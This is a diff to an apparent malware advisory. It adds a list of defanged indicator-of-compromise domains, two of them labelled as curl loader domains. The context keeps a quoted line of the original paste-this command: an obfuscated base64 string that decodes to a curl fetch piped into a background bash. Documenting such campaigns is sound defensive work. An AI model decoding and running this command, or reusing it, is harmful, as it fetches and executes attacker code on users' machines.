@@ -10,3 +10,16 @@ Orginal contents of copy commands was:
 echo "Y3VybCAtcyBodHRwczovL2dhbW1hLnBsYWluZmVuYXNzb2NpYXRlcy5jb20vc3RyaXgvaW5kZXgucGhwIHwgbm9odXAgYmFzaCAm" | base64 -d | bas[h]
 ```
 
+IoCs:
+
+- javascriptbasics[.]com
+- javascriptbasics[.]com
+- jqueryapihelpers[.]com
+- meshsorterio[.]com
+- gamma.meshsorterio[.]com <- curl loader domain
+- gamma.plainfenassociates[.]com <- curl loader domain
+- plainfenassociates[.]com
+- javascripterhub[.]com
+- typescripttools[.]com
+- modestknollpartners[.]com
+- proxyreflecttools[.]com
